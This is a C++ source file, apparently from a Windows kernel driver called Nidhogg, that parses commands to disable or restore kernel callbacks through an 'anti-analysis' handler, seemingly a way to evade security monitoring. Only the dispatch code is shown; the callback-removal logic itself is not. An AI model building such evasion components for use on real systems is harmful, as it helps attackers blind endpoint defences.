#include "pch.h"
#include "CallbacksParser.h"
#include "AntiAnalysisHandler.h"

CallbacksParser::CallbacksParser() {
	this->optionsSize = 2;
	this->options = AllocateMemory<OptionMetadata*>(this->optionsSize * sizeof(OptionMetadata));

	if (!this->options)
		ExRaiseStatus(STATUS_INSUFFICIENT_RESOURCES);

	this->options[0] = { Options::Enable, { 2, { ArgType::ULong, ArgType::ULong } } };
	this->options[1] = { Options::Disable, { 2, { ArgType::ULong, ArgType::ULong } } };
}

/*
* Description:
* Execute is responsible for executing a command and returning its value.
*
* Parameters:
* @commandId [Options]  -- Command to run.
* @args		 [PVOID*]	-- Array of args to send to the command.
*
* Returns:
* @status	 [NTSTATUS] -- Result of the command.
*/
NTSTATUS CallbacksParser::Execute(Options commandId, PVOID args[MAX_ARGS]) {
	IoctlKernelCallback callback{};
	NTSTATUS status = STATUS_SUCCESS;

	callback.CallbackAddress = *(ULONG*)args[0];
	callback.Type = *(CallbackType*)args[1];

	if (callback.CallbackAddress == 0 || callback.Type > CmRegistryType)
		return STATUS_INVALID_PARAMETER;

	switch (commandId) {
	case Options::Enable:
	{
		callback.Remove = false;
		status = NidhoggAntiAnalysisHandler->RestoreCallback(callback);
		break;
	}
	case Options::Disable:
	{
		callback.Remove = true;
		status = NidhoggAntiAnalysisHandler->ReplaceCallback(callback);
		break;
	}
	default:
	{
		status = STATUS_NOT_IMPLEMENTED;
		break;
	}
	}

	return status;
}
